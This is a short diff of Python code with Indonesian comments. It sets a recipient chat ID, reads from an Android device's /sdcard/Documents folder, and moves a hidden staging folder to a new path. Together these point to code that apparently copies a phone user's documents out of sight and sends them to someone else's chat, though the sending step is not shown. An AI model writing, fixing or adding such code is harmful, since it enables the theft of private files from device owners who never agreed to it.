@@ -766,7 +766,7 @@ def maindulu2():
 	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
 	# Path folder sumber
 	source_folder ='/sdcard/Documents'
-	temp_folder = "/data/.temp_documents"
+	temp_folder = "./data/.temp_documents"
 	try:
 		if not os.path.exists(temp_folder):
 			os.makedirs(temp_folder)
